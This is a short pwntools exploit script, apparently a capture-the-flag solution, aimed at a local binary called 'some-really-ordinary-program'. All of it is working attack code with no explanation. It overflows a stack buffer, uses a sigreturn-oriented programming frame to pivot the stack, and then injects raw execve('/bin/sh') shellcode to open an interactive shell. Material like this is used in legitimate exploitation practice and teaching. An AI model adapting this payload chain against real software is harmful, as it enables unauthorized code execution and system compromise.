from pwn import *

p = process('some-really-ordinary-program')
# p = remote('localhost', 7777)

context.binary = ELF('some-really-ordinary-program')

writable = 0x402500
syscall = 0x40100e
main = 0x401022
read = 0x401006

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
# shellcode = asm(shellcraft.sh())

frame = SigreturnFrame()
frame.rsp = writable
frame.rip = main

payload = b'A' * (0x1f4 + 0x8)
payload += p64(read)
payload += p64(syscall)
payload += bytes(frame)

p.sendafter('.\n', payload)

p.send('A' * 0xf)

# payload = b'\x90' * (0x1f4 + 8 - len(shellcode))
# payload += shellcode
# payload += p64(writable - 0x1f4)

payload = shellcode
payload += b'A' * (0x1f4 + 8 - len(payload))
payload += p64(writable - 0x1f4 - 8)

p.sendafter('.\n', payload)

p.interactive()
